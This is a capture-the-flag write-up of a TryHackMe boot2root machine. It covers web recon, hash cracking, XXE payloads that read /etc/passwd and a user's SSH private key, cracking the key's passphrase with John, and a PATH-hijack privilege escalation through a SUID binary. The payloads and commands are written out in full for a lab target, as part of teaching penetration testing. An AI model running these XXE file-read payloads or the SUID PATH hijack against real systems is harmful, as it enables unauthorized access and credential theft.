### Mustachio

Easy boot2root Machine

## Recon

As at the beginning of every hack we need to collect information and I started with NMap using the command ```nmap -sV -sC mustachio.thm -p-``` and got this answer:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After that I went to the site to get my first impressions and in the meantime I left Dirsearch running using the command ```dirsearch -w /usr/share/wordlists/dirb/big.txt -u mustachio.thm```.

![](Screenshot_1.png)

When I looked at the terminal that was running Dirsearch it brought me this:

```
[22:13:19] 301 -  303B  - /custom  ->  http://ctf.thm/custom/   
[22:13:36] 301 -  302B  - /fonts  ->  http://ctf.thm/fonts/   
[22:13:48] 301 -  303B  - /images  ->  http://ctf.thm/images/
[22:14:35] 200 -   28B  - /robots.txt                     
[22:14:40] 403 -  272B  - /server-status  
```

In the Custom folder I found a file called "user.bak" in mustachio.thm/custom/js

![](Screenshot_2.png)

I downloaded the file and opened a terminal in the Downloads folder and typed the command ```strings user.bak```. Inside the file I found a username called admin and a password in hash format. So I used crackstation.net to crack the password and this was the result:

## Vulnerability Analysis and Exploration

![](Screenshot_3.png)

Wow! We managed to crack the hash and get the password, we are on the right path. Let's keep it there because we'll be using it in the future.
I explored the other directories that I found with Dirsearch but I didn't find anything interesting. Then I went to HTTP port 8765 and took the opportunity to use Dirsearch on it too:

![](Screenshot_4.png)

Now we find an admin panel and we can use the credentials found on port 80.

![](Screenshot_5.png)

Yes! We managed to get into the admin panel, now we need to take a look at this panel and find out its functions.
Well, after a while of looking for something in the admin panel I ended up intercepting the request I made to the server when I wrote something in the comments part. So I decided to look at the request response and found this:

![](Screenshot_6.png)

Wow! We found another file on the web, let's download it and see what's in it.

```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

We found a message that was written in XML, what's the flaw using XML ? Are you thinking the same thing as me? Yes XXE is the fault, I'm already happy to get to that part lol. I applied the same message and gave this result:

![](Screenshot_7.png)

Well, we saw above that there was a message telling Barry that his SSH key was ready, when I got this username I tried to crack his SSH password but it gave this result: ```[ERROR] target ssh: //mustachio.thm:22/ does not support password authentication (method reply 4).```.

So I tried to log in using SSH and this error came up: ```barry@mustachio.thm: Permission denied (publickey).```.

So we need an id_rsa.pub to get one of the first steps to access the system, well let's enumerate more users, I will use a payload of XXE to get /etc/passwd.

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<comment>
<name>Joe</name>
<author>MrEmpy</author>
<com>&file;</com>
</comment>
```

![](Screenshot_8.png)

Yes! We were able to enumerate the users, so we have 3 users root, joe, barry. We'll save them for future exploration. Well now that I know the users I'm going to try to get the id_rsa.pub starting with the user Barry.

![](Screenshot_9.png)

Good we got it, I tried it with the user Joe but I wasn't successful. Now copy id_rsa.pub and paste it into your id_rsa.pub on your system. Example: ```echo "<target id_rsa.pub> >> /root/.ssh/id_rsa.pub``` or with Kali user ```echo "<target id_rsa.pub> >> /home/kali/ .ssh/id_rsa.pub```.

Well, since Barry has an id_rsa.pub he probably has an id_rsa too. So let's try to get his RSA.

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
<!ENTITY file SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
<name>Joe</name>
<author>MrEmpy</author>
<com>&file;</com>
</comment>
```

![](Screenshot_10.png)

Yes! We got id_rsa and id_rsa.pub, id_rsa just this half pie more than to fix it, it just has to look like this model:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
(...)
```

There we fixed the id_rsa. Copy and paste it into your folder and allow it using the command ```chmod 600 <id_rsa>``` and now let's try to log into the machine with the command ```ssh -i <id_rsa> barry@mustachio.thm ```.

Well here is asking for a key password. We have to crack this id_rsa and figure out the password, so let's use the ssh2john.py tool, you can find it by typing the command ```locate ssh2john.py``` but if it doesn't exist you will need to download the John tool first.

Now I'm going to turn id_rsa into a bunch of characters that only John understands for us to crack the password. Run these commands:

```
/usr/share/john/ssh2john.py <id_rsa> > john.txt

john --wordlist=/usr/share/wordlists/rockyou.txt john.txt
```

Good! We managed to crack the RSA password! Now just log in with the command ```ssh -i <id_rsa> barry@mustachio.thm```. It's asking for password so let's put in the password we got.

## Post Exploitation
![](Screenshot_11.png)

Wow we are in the system! That's really good! Now just get the user.txt flag.

Now we need to escalate privilege to become root, let's go to the home/joe folder. It has a file called live_log and if we type ```ls -la live_log``` we will see this ```-rwsr-xr-x 1 root root 16832 Jun 12 15:48 live_log```.
This indicates that this file has SUID and can be used to scale privileges, since if we run this file with just the ```./live_log``` command we will be running it with ROOT.

When I looked at this file I thought of typing ```strings live_log``` and found something interesting in it:

![](Screenshot_12.png)

Observing this I saw that it was a command so I copied the command and tried to run it with the user Barry but it gave Permission Denied, this is more proof that when we run a file that has rwsr we are running as root.

When I saw this I quickly remembered TryHackMe's Kenobi room:

![](Screenshot_13.png)

I saw that we could change the tools folder from /usr/bin and a custom one like /tmp/attacker and create our own tool like the tail that was mentioned inside live_log. What if we change /usr/bin to /tmp/attacker and create a tool called tail and put a shell inside it? Does it work? Let's test it, first let's create a folder inside /tmp called attacker ```mkdir /tmp/attacker``` and then go into it.
Now let's change the /usr/bin folder to /tmp/attacker using the command ```export PATH=/tmp/attacker:$PATH```.

Now we're going to create the tail file, let's add this to it:

```echo '#!/bin/bash' > tail```

```echo '/bin/bash' >> tail```

After that let's type ```chmod +x tail```. Now let's go back to the live_log folder and let's run it.

![](Screenshot_14.png)

GG! Yes! We managed to hack the machine and get the root.txt flag. And so we finished another CTF. It is very rewarding to be able to hack a machine.

Thanks for reading my Writeup, I have a YouTube channel if you can subscribe it will help me a lot
https://www.youtube.com/channel/UCol7qlIUc0o0JKmdrmTWQtA

To the next :)
